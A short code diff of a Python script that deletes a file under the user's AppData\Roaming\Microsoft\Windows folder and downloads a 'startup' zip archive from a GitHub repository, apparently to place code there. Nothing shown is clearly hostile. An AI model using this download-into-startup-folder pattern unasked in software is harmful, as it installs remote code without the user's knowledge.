@@ -10,7 +10,7 @@ user_profile = os.environ['USERPROFILE']
 target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
 os.makedirs(target_path, exist_ok=True)
 
-shutil.rmtree(os.path.join(target_path, 'skibidi-startup'))
+os.remove(os.path.join(target_path, 'skibidi-startup', "startup.py"))
 
 r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/startup.zip", allow_redirects=True)
 file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-startup.zip')
